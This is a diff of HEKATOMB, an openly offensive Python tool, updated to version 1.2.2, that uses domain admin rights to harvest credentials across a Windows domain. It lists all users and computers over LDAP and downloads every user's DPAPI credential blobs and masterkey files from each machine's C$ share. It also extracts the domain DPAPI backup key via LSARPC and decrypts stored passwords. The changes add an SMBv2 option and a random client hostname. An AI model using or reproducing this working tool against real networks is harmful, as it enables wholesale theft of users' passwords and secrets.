@@ -2,7 +2,7 @@
 #
 # HEKATOMB - Because Domain Admin rights are not enough. Hack them all.
 #
-# V 1.2
+# V 1.2.2
 #
 # Copyright (C) 2022 Les tutos de Processus. All rights reserved.
 #
@@ -14,21 +14,22 @@
 #
 # Author:
 #   Processus (@ProcessusT)
+# Collaborators:
+#	C0wnuts (@kevin_racca)
 #
 
-import os
-import sys
-import argparse
+import os, sys, argparse, random, string
+from ldap3 import Connection, Server, NTLM, ALL
 from impacket.examples.utils import parse_target
 from impacket.smbconnection import SMBConnection
+from impacket.smb3structs import SMB2_DIALECT_002
 from impacket.dcerpc.v5 import transport, lsad
-from impacket.ldap import ldap
 from impacket import crypto
 from impacket.uuid import bin_to_string
 from impacket.dpapi import CredHist, PVK_FILE_HDR, PREFERRED_BACKUP_KEY, PRIVATE_KEY_BLOB, privatekeyblob_to_pkcs1, MasterKeyFile, MasterKey, DomainKey, DPAPI_DOMAIN_RSA_MASTER_KEY, CredentialFile, DPAPI_BLOB, CREDENTIAL_BLOB
 import struct
 import binascii
-from binascii import unhexlify, hexlify
+from binascii import hexlify
 import dns.resolver
 from impacket.examples.smbclient import MiniImpacketShell
 import traceback
@@ -53,13 +54,14 @@ def main():
 	auth.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
 
 	options = parser.add_argument_group('authentication')
-	options.add_argument('-pvk', action='store', help='\t\t\t\t\t\t\t\t\t\tdomain backup keys file')
+	options.add_argument('-pvk', action='store', help='\t\t\t\t\t\t\t\t\t\tDomain backup keys file')
 	options.add_argument('-dns', action="store", help='DNS server IP address to resolve computers hostname')
 	options.add_argument('-dnstcp', action="store_true", help='Use TCP for DNS connection')
-	options.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="port", help='port to connect to SMB Server')
+	options.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="port", help='Port to connect to SMB Server')
+	options.add_argument('-smb2', action="store_true", help='Force the use of SMBv2 protocol')
 	options.add_argument('-just-user', action='store', help='Test only specified username')
 	options.add_argument('-just-computer', action='store', help='Test only specified computer')
-	options.add_argument('-md5', action="store_true", help='Print md5 hash insted of clear passwords')
+	options.add_argument('-md5', action="store_true", help='Print md5 hash instead of clear passwords')
 	
 	verbosity = parser.add_argument_group('verbosity')
 	verbosity.add_argument('-csv', action="store_true", help='Export results to CSV file')
@@ -72,16 +74,21 @@ def main():
 		sys.exit(1)
 
 
-	options = parser.parse_args()
+	options                             = parser.parse_args()
 	domain, username, password, address = parse_target(options.target)
-
+	passLdap 							= password
 	if domain is None:
 		domain = ''
 	if password == '' and username != '' and options.hashes is None :
 		from getpass import getpass
 		password = getpass("Password:")
+		passLdap = password
 	if options.hashes is not None:
 		lmhash, nthash = options.hashes.split(':')
+		if '' == lmhash:
+			lmhash = 'aad3b435b51404eeaad3b435b51404ee'
+		passLdap       = f"{lmhash}:{nthash}"
+
 	else:
 		lmhash = ''
 		nthash = ''
@@ -91,11 +98,20 @@ def main():
 	else:
 		dns_server = options.dns
 
+	if options.smb2 is True:
+		preferredDialect = SMB2_DIALECT_002
+	else:
+		preferredDialect = None
+
+	myNameCharList = string.ascii_lowercase
+	myNameLen      = random.randrange(6,12)
+	myName         = ''.join((random.choice(myNameCharList) for i in range(myNameLen)))
+
 	# test if account is domain admin by accessing to DC c$ share
 	try:
 		if options.debug is True or options.debugmax is True:
 			print("Testing admin rights...")
-		smbClient = SMBConnection(address, address, sess_port=int(options.port))
+		smbClient = SMBConnection(address, address, myName=myName, sess_port=int(options.port), preferredDialect=preferredDialect)
 		smbClient.login(username, password, domain, lmhash, nthash)
 		if smbClient.connectTree("c$") != 1:
 			raise
@@ -103,51 +119,49 @@ def main():
 			print("Admin access granted.")
 	except:
 		print("Error : Account disabled or access denied. Are you really a domain admin ?")
-		sys.exit(1)
 		if options.debug is True or options.debugmax is True:
 			import traceback
 			traceback.print_exc()
-
+		sys.exit(1)
 
 
 	# try to connect to ldap
-	try:
-		# Create the baseDN
-		domainParts = domain.split('.')
-		baseDN = ''
-		for i in domainParts:
-			baseDN += 'dc=%s,' % i
-		# Remove last ','
-		baseDN = baseDN[:-1]
 
+	if options.debug is True or options.debugmax is True:
+		print("Testing LDAP connection...")
+
+	connectionFailed = False
+	serv 			 = Server(address, get_info=ALL, use_ssl=True, connect_timeout=15)
+	ldapConnection   = Connection(serv, user=f"{domain}\\{username}", password=passLdap, authentication=NTLM)
+
+	try:
+		if not ldapConnection.bind():
+			print("Error : Could not connect to ldap : bad credentials")
+			sys.exit(1)
 		if options.debug is True or options.debugmax is True:
-			print("Testing LDAP connection...")
-		ldapConnection = ldap.LDAPConnection('ldap://%s' % options.target, baseDN, address)
-		ldapConnection.login(username, password, domain, lmhash, nthash)
-		if options.debug is True or options.debugmax is True:
-			print("LDAP connection successfull without encryption.")
-	except ldap.LDAPSessionError as e:
-		if str(e).find('strongerAuthRequired') >= 0:
-			try:
-				# We need to try SSL
-				ldapConnection = ldap.LDAPConnection('ldaps://%s' % options.target, baseDN, address)
-				ldapConnection.login(username, password, domain, lmhash, nthash)
-				if options.debug is True or options.debugmax is True:
-					print("LDAP connection successfull with SSL encryption.")
-			except:
-				ldapConnection.close()
-				print("Error : Could not connect to ldap.")
-				if options.debug is True or options.debugmax is True:
-					import traceback
-					traceback.print_exc()
-		else:
-			ldapConnection.close()
+			print("LDAP connection successfull with SSL encryption.")
+	except:
+		print("Error : Could not connect to ldap with SSL encryption. Trying without SSL encryption...")
+		connectionFailed = True
+
+	if True == connectionFailed:
+		try:
+			serv = Server(address, get_info=ALL, connect_timeout=15)
+			ldapConnection = Connection(serv, user=f"{domain}\\{username}", password=passLdap, authentication=NTLM)
+			if not ldapConnection.bind():
+				print("Error : Could not connect to ldap : bad credentials")
+				sys.exit(1)
+			if options.debug is True or options.debugmax is True:
+				print("LDAP connection successfull without encryption.")
+		except:
 			print("Error : Could not connect to ldap.")
 			if options.debug is True or options.debugmax is True:
 				import traceback
 				traceback.print_exc()
+			sys.exit(1)
 
-
+	# Create the baseDN
+	baseDN = serv.info.other['defaultNamingContext'][0]
 
 	# catch all users in domain or just the specified one
 	if options.just_user is not None :
@@ -159,49 +173,31 @@ def main():
 		if options.debug is True or options.debugmax is True:
 			print("Retrieving user objects in LDAP directory...")
 		users_list = []
-		ldap_users = ldapConnection.search(searchFilter=searchFilter, attributes=['sAMAccountName', 'objectSID'], sizeLimit=9999)
+		ldapConnection.search('%s' % (baseDN), searchFilter, attributes=['sAMAccountName', 'objectSID'])
+		ldap_users = ldapConnection.entries
 		if options.debug is True or options.debugmax is True:
 			print("Converting ObjectSID in string SID...")
+		
 		for user in ldap_users:
 			try:
-				ldap_username = str( str(user[1]).split("vals=SetOf:")[2] ).strip()
-				sid = str( str( str(user[1]).split("vals=SetOf:")[1]).split("PartialAttribute")[0] ).strip()[2:]
-				# convert objectsid to string sid
-				binary_string = binascii.unhexlify(sid)
-				version = struct.unpack('B', binary_string[0:1])[0]
-				authority = struct.unpack('B', binary_string[1:2])[0]
-				sid_string = 'S-%d-%d' % (version, authority)
-				binary_string = binary_string[8:]
-				for i in range(authority):
-					value = struct.unpack('<L', binary_string[4*i:4*(i+1)])[0]
-					sid_string += '-%d' % value
-				name_and_sid = [ldap_username.strip(), sid_string]
-				
-				users_list.append( name_and_sid )
+				ldap_username = str(user['sAMAccountName'])
+				sid           = str(user['objectSID'])
+				name_and_sid  = [ldap_username.strip(), sid]
+				users_list.append(name_and_sid)
 			except:
 				pass 
 				# some users may not have samAccountName
 		if options.debug is True or options.debugmax is True:
 			print("Found about " + str( len(users_list) ) + " users in LDAP directory.")
-	except ldap.LDAPSearchError as e:
-		if e.getErrorString().find('sizeLimitExceeded') >=0:
-			print(e)
-			ldap_users = e.getAnswers()
-			pass # LDAP results limit reached
-		else:
-			raise
 	except:
-		ldapConnection.close()
 		print("Error : Could not extract users from ldap.")
 		if options.debug is True or options.debugmax is True:
 			import traceback
 			traceback.print_exc()
+		sys.exit(1)
 	if len(users_list) == 0:
 		print("No user found in LDAP directory")
 		sys.exit(1);
-
-
-
 
 
 	# catch all computers in domain or just the specified one
@@ -213,34 +209,23 @@ def main():
 		try:
 			if options.debug is True or options.debugmax is True:
 				print("Retrieving computer objects in LDAP directory...")
-			searchFilter = "(&(objectCategory=computer)(objectClass=computer))"
+			searchFilter   = "(&(objectCategory=computer)(objectClass=computer))"
 			computers_list = []
-			ldap_computers = ldapConnection.search(searchFilter=searchFilter, attributes=['cn'], sizeLimit=9999)
+			ldapConnection.search('%s' % (baseDN), searchFilter, attributes=['cn'])
+			ldap_computers = ldapConnection.entries
 			for computer in ldap_computers:
 				try:
-					comp_name = str( str(computer).split("type=cn")[1] ).split("vals=SetOf:")[1]
-					computers_list.append( comp_name.strip() )
+					comp_name = str(computer['cn'])
+					computers_list.append(comp_name.strip())
 				except:
 					pass
 			if options.debug is True or options.debugmax is True:
 				print("Found about " + str( len(computers_list) ) + " computers in LDAP directory.")
-		except ldap.LDAPSearchError as e:
-			if e.getErrorString().find('sizeLimitExceeded') >=0:
-				print(e)
-				ldap_users = e.getAnswers()
-				pass # LDAP results limit reached
-			else:
-				raise
 		except:
-			ldapConnection.close()
 			print("Error : Could not extract computers from ldap.")
 			if options.debug is True or options.debugmax is True:
 				import traceback
 				traceback.print_exc()
-
-
-
-
 
 	# creating folders to store blob and mkf
 	if options.debug is True or options.debugmax is True:
@@ -250,7 +235,7 @@ def main():
 	else:
 		directory = domain
 	blobFolder = domain + "/blob"
-	mkfFolder = domain + "/mfk"
+	mkfFolder  = domain + "/mfk"
 	if not os.path.exists(directory):
 	    os.mkdir(directory)
 	if not os.path.exists(blobFolder):
@@ -260,17 +245,15 @@ def main():
 
 
 
-
-	
 	if options.debug is True or options.debugmax is True:
 		print("Connnecting to all computers to test user creds existence...")
 	for current_computer in computers_list:
 		# connect to all computers and extract all users blobs and mkf
 		try:
 			# resolve dns to ip address
-			resolver = dns.resolver.Resolver(configure=False)
+			resolver             = dns.resolver.Resolver(configure=False)
 			resolver.nameservers = [dns_server]
-			current_computer = current_computer + "." + domain
+			current_computer     = current_computer + "." + domain
 			if options.dnstcp is True:
 				answer = resolver.resolve(current_computer, "A", tcp=True)
 			else:
@@ -279,13 +262,12 @@ def main():
 				sys.exit(1)
 			else:
 				answer = str(answer[0])
-			smbClient = SMBConnection(answer, answer, sess_port=int(options.port), timeout=10)
+			smbClient  = SMBConnection(answer, answer, myName=myName, sess_port=int(options.port), timeout=10, preferredDialect=preferredDialect)
 			smbClient.login(username, password, domain, lmhash, nthash)
 			tid = smbClient.connectTree('c$')
 			if tid != 1:
 				sys.exit(1)
 
-			
 			for current_user in users_list:
 				try:
 					if options.debugmax is True:
@@ -293,12 +275,12 @@ def main():
 					response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\*")
 					is_there_any_blob_for_this_user = False
 					count_blobs = 0
-					count_mkf = 0
+					count_mkf   = 0
 					for blob_file in response:
 						blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
 						if blob_file != "." and blob_file != "..":
 							# create and retrieve the credential blob
-							count_blobs = count_blobs + 1
+							count_blobs     = count_blobs + 1
 							computer_folder = blobFolder + "/" + str(current_computer)
 							if not os.path.exists(computer_folder):
 								os.mkdir(computer_folder)
@@ -309,11 +291,12 @@ def main():
 							smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Credentials\\" + blob_file, wf.write)
 							is_there_any_blob_for_this_user = True
 					response = smbClient.listPath("C$", "\\users\\" + current_user[0] + "\\appData\\Local\\Microsoft\\Credentials\\*")
+
 					for blob_file in response:
 						blob_file = str( str(blob_file).split("longname=\"")[1] ).split("\", filesize=")[0]
 						if blob_file != "." and blob_file != "..":
 							# create and retrieve the credential blob
-							count_blobs = count_blobs + 1
+							count_blobs     = count_blobs + 1
 							computer_folder = blobFolder + "/" + str(current_computer)
 							if not os.path.exists(computer_folder):
 								os.mkdir(computer_folder)
@@ -330,7 +313,7 @@ def main():
 							mkf = str( str(mkf).split("longname=\"")[1] ).split("\", filesize=")[0]
 							if mkf != "." and mkf != ".." and mkf != "Preferred" and mkf[0:3] != "BK-":
 								count_mkf = count_mkf + 1
-								wf = open(mkfFolder + "/" + mkf,'wb')
+								wf        = open(mkfFolder + "/" + mkf,'wb')
 								smbClient.getFile("C$", "\\users\\" + current_user[0] + "\\appData\\Roaming\\Microsoft\\Protect\\" + current_user[1] + "\\" + mkf, wf.write)
 						print("\nNew credentials found for user " + str(current_user[0]) + " on " + str(current_computer) + " :")
 						print("Retrieved " + str(count_blobs) + " credential blob(s) and " + str(count_mkf) + " masterkey file(s)")	
@@ -362,7 +345,7 @@ def main():
 		# get domain backup keys
 		try:
 			array_of_mkf_keys = []
-			connection = SMBConnection(address, address)
+			connection        = SMBConnection(address, address, myName=myName, preferredDialect=preferredDialect)
 			connection.login(username, password, domain, lmhash, nthash)
 			# create rpc pipe
 			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\lsarpc]')
@@ -374,22 +357,22 @@ def main():
 			resp = lsad.hLsarOpenPolicy2(dce, lsad.POLICY_GET_PRIVATE_INFORMATION)
 
 			# now retrieve backup key GUID : https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/e8118398-d3da-45fc-827f-186f1c417b69
-			buffer = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce, resp['PolicyHandle'], "G$BCKUPKEY_PREFERRED"))
-			guid = bin_to_string(buffer)
-			name = "G$BCKUPKEY_{}".format(guid)
-			secret = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce, resp['PolicyHandle'], name))
+			buffer     = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce, resp['PolicyHandle'], "G$BCKUPKEY_PREFERRED"))
+			guid       = bin_to_string(buffer)
+			name       = "G$BCKUPKEY_{}".format(guid)
+			secret     = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce, resp['PolicyHandle'], name))
 			backup_key = PREFERRED_BACKUP_KEY(secret)
-			pvk = backup_key['Data'][:backup_key['KeyLength']]
+			pvk 	   = backup_key['Data'][:backup_key['KeyLength']]
 
 			# see my PR on pypykatz to understand structure : https://github.com/skelsec/pypykatz/blob/master/pypykatz/dpapi/dpapi.py
-			header = PVK_FILE_HDR()
-			header['dwMagic'] = 0xb0b5f11e
-			header['dwVersion'] = 0
-			header['dwKeySpec'] = 1
+			header                  = PVK_FILE_HDR()
+			header['dwMagic']       = 0xb0b5f11e
+			header['dwVersion']     = 0
+			header['dwKeySpec']     = 1
 			header['dwEncryptType'] = 0
 			header['cbEncryptData'] = 0
-			header['cbPvk'] = backup_key['KeyLength']
-			key = header.getData() + pvk
+			header['cbPvk']         = backup_key['KeyLength']
+			key                     = header.getData() + pvk
 			open(directory + "/pvkfile.pvk", 'wb').write(key)
 		except:
 			print("Error : Can't extract domain backup keys.")
@@ -397,8 +380,6 @@ def main():
 				import traceback
 				traceback.print_exc()
 			sys.exit(1)
-
-
 
 
 
@@ -470,9 +451,6 @@ def main():
 		os._exit(1)	
 
 
-	
-
-
 
 	if len(array_of_mkf_keys) > 0:
 		# We have MKF keys so we can start blob decryption
@@ -487,10 +465,10 @@ def main():
 					if username != "." and username != ".." and os.path.isdir(current_user_folder):
 						for filename in os.listdir(current_user_folder):
 							try:
-								fp = open(current_user_folder + "/" + filename, 'rb')
+								fp   = open(current_user_folder + "/" + filename, 'rb')
 								data = fp.read()
 								cred = CredentialFile(data)
-								blob = DPAPI_BLOB(cred['Data'])				
+								blob = DPAPI_BLOB(cred['Data'])
 
 								if options.debugmax is True:
 									print("Starting decryption of blob " + filename + "...")
@@ -520,7 +498,7 @@ def main():
 											traceback.print_exc()
 										pass
 							except:
-								if options.debugmax is True:
+								if options.debug is True:
 									print("Error occured while decrypting blob file.")
 									import traceback
 									traceback.print_exc()
@@ -562,7 +540,6 @@ def main():
 	else:
 		print("No MKF have been decrypted.\nBlobs will not be decrypted.")
 		os._exit(1)
-
 
 
 
